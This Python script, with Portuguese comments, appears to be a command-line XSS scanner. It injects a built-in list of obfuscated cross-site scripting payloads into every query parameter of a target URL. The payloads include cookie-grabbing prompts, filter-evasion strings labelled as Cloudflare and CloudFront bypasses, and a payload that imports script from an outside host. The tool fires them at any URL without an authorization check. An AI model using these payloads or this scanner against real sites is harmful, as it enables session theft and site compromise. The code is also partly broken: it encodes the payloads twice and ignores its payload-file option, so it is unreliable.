import argparse
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, quote
from colorama import Fore, Style

# Exemplos de payloads XSS para testes
example_payloads = [
    '%3CIFRAME%20SRC%3D%22javascript%3Aprompt(document.cookie)%3B%22%3E%3C%2Fiframe%3E',
    '%27%3Bk%3D%27e%27%0Atop%20//',
    '%22%3E%3CA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%20%3E',
    '%3Csvg%2Fonload%3Dwindow%5B%22al%22%2B%22ert%22%5D1337%3E',
    '%3CImg%20Src%3DOnXSS%20OnError%3Dconfirm%281337%29%3E',
    '%3CSvg%20Only%3D1%20OnLoad%3Dconfirm%28document.domain%29%3E',
    '%3Csvg%20onload%3Dalert%26%230000000040document.cookie%29%3E',
    '%3CsVG%2FoNLY%253d1%2F%2A%2A%2FOn%2BONloaD%253dco%5Cu006efirm%2526%2523x28%3B%2526%2523x29%3B%3E',
    '%253CSVG%2FoNlY%3D1%2520ONlOAD%3Dconfirm%28document.domain%29%253E',
    '%3CImg%20Src%3D%2F%2FX55.is%20OnLoad%250C%3Dimport%28Src%29%3E',
    '%3CSvg%20Only%3D1%20OnLoad%3Dconfirm%28atob%28%22Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ%3D%3D%22%29%29%3E',
    '%22%3E%3C%3Cdetails%2Fopen%2Fontoggle%3Dconfirm%28%27XSS%27%29%3E',
    '6%27%22%28%29%26%25%22%3E%3Csvg%2Fonload%3Dprompt%281%29%3E%2F',
    '%27%3Bwindow%2F%2Aaabb%2A%2F%5B%27al%27%2B%27ert%27%5D%28document.%2F%2Aaabb%2A%2Flocation%29%3B%2F%2F',
    '%22%3E%0D%0A%0D%0A%3Cx%20%27%3D%5C%22foo%5C%22%3E%3Cx%20foo%3D%27%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28cloudfrontbypass%29%2F%2F%27%3E',
    '%3Csvg%20onload%3D%27new%20Function%5B%22Y000%21%22%5D.find%28al%5Cu0065rt%29%27%3E',
    '%3CImg%20Src%3D%2F%2FX55.is%20OnLoad%250C%3Dimport%28Src%29%3E',
    '%3CsVg%20OnPointerEnter%3D%22location%3Djavas%2Bcript%3Aale%2Brt%252%2B81%252%2B9%3B%2F%2F%3C%2Fdiv%22%3E',
    '%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000000029%3B%3E'
]

def scan_xss(url, payloads_file, match_regex, show_code_200, save_file):
    payloads = example_payloads  # Utilizando os payloads de exemplo

    total_payloads = len(payloads)
    successful_payloads = 0
    code_200_payloads = 0

    results = []

    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = parse_qs(parsed_url.query)

    for payload in payloads:
        encoded_payload = quote(payload)

        # Constrói a nova query string com o payload
        new_query_params = query_params.copy()
        for key in new_query_params:
            new_query_params[key] = encoded_payload

        new_query_string = urlencode(new_query_params, doseq=True)
        test_url = f"{base_url}?{new_query_string}"

        response = requests.get(test_url)
        status_code = response.status_code
        content = response.text

        if status_code == 200:
            code_200_payloads += 1
            if save_file:
                with open(save_file, 'a') as sf:
                    sf.write(f"{test_url}\n")

        if match_regex:
            matches = re.findall(match_regex, content, re.IGNORECASE)
            if matches:
                results.append(f"{Fore.GREEN}Payload '{payload}' matched regex '{match_regex}' at URL: {test_url}{Style.RESET_ALL}")
                successful_payloads += 1
        else:
            # Verifica palavras-chave no conteúdo da resposta
            keywords = ['alert', 'xss', 'popup']  # Palavras-chave relevantes
            for keyword in keywords:
                if keyword in content.lower():
                    results.append(f"{Fore.GREEN}Found '{keyword}' in response at URL: {test_url}{Style.RESET_ALL}")
                    successful_payloads += 1
                    break

    if show_code_200:
        results = [result for result in results if '200' in result]

    print("\n".join(results))

    print(f"\nTotal payloads tested: {total_payloads}")
    print(f"Successful payloads: {successful_payloads}")
    print(f"Payloads returning code 200: {code_200_payloads}")
    print(f"Failed payloads: {total_payloads - successful_payloads}")

def main():
    parser = argparse.ArgumentParser(description='XSS Scanner similar to ffuf with -mr option')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--payloads', required=False, help='File containing XSS payloads')
    parser.add_argument('-mr', '--match-regex', help='Regex pattern to match relevant keywords in response')
    parser.add_argument('-c', '--code-200', action='store_true', help='Show only URLs returning code 200')
    parser.add_argument('-s', '--save', help='File to save URLs with successful payloads')

    args = parser.parse_args()

    scan_xss(args.url, args.payloads, args.match_regex, args.code_200, args.save)

if __name__ == '__main__':
    main()
